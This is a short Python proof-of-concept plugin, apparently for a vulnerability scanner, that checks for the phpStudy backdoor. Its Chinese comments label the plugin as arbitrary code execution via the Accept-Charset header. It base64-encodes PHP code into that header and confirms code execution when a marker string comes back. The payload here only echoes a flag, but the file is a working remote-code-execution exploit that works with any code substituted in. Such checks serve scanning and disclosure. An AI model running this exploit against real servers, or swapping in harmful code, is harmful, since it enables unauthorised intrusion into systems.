
import HackRequests
import base64

def poc(arg, **kwargs):
    hack = HackRequests.hackRequests()
    flag = "c8cfaae6f773f763234646e188f84eb3"
    prexp = 'echo "{}";'.format(flag)
    exp = base64.b64encode(prexp.encode()).decode()
    headers = {'Accept-Encoding': 'gzip,deflate',
               'Accept-Charset': exp
            }
    hh= hack.http(arg,headers=headers)
    if hh.status_code == 200 and flag in hh.text():
        result = {
            "name": "phpstudy任意代码执行",  # 插件名称
            "content": "在header头Accept-Charset中执行base64编码的代码",  # 插件返回内容详情，会造成什么后果。
            "url": arg,  # 漏洞存在url
            "log": hh.log,
            "tag": "code_eval"  # 漏洞标签
        }
        return result